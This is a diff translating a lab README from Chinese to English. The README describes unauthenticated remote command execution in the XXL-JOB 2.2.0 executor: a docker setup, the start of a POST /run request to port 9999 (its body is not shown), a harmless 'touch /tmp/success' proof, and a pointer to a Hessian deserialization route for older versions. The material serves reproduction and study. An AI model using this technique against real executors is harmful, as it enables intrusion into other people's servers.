@@ -1,26 +1,30 @@
-# XXL-JOB executor 未授权访问漏洞
+# XXL-JOB Executor Unauthorized Access
 
-XXL-JOB是一个分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。现已开放源代码并接入多家公司线上产品线，开箱即用。XXL-JOB分为admin和executor两端，前者为后台管理页面，后者是任务执行的客户端。executor默认没有配置认证，未授权的攻击者可以通过RESTful API执行任意命令。
+[中文版本(Chinese version)](README.zh-cn.md)
 
-参考链接：
+XXL-JOB is a distributed task scheduling platform with core design goals of rapid development, simple learning, lightweight, and easy extensibility. It is now open source and has been integrated into many companies' production lines, ready to use out of the box.
+
+XXL-JOB is divided into two parts: admin and executor, where the former is the backend management page and the latter is the task execution client. The executor has no authentication configured by default, allowing unauthorized attackers to execute arbitrary commands through the RESTful API.
+
+References:
 
 - https://mp.weixin.qq.com/s/jzXIVrEl0vbjZxI4xlUm-g
 - https://landgrey.me/blog/18/
 - https://github.com/OneSourceCat/XxlJob-Hessian-RCE
 
-## 环境搭建
+## Environment Setup
 
-执行如下命令启动2.2.0版本的XXL-JOB：
+Execute the following command to start XXL-JOB version 2.2.0:
 
 ```
 docker compose up -d
 ```
 
-环境启动后，访问`http://your-ip:8080`即可查看到管理端（admin），访问`http://your-ip:9999`可以查看到客户端（executor）。
+After the environment is started, you can access the management end (admin) at `http://your-ip:8080` and the client end (executor) at `http://your-ip:9999`.
 
-## 漏洞复现
+## Vulnerability Reproduction
 
-向客户端（executor）发送如下数据包，即可执行命令：
+Send the following data packet to the client (executor) to execute commands:
 
 ```
 POST /run HTTP/1.1
@@ -51,8 +55,8 @@ Content-Length: 365
 
 ![](1.png)
 
-`touch /tmp/success`已成功执行：
+The command `touch /tmp/success` has been successfully executed:
 
 ![](2.png)
 
-另外，低于2.2.0版本的XXL-JOB没有RESTful API，我们可以通过[Hessian反序列化](https://github.com/OneSourceCat/XxlJob-Hessian-RCE)来执行命令。
+Additionally, for XXL-JOB versions below 2.2.0 that don't have a RESTful API, we can execute commands through [Hessian deserialization](https://github.com/OneSourceCat/XxlJob-Hessian-RCE).
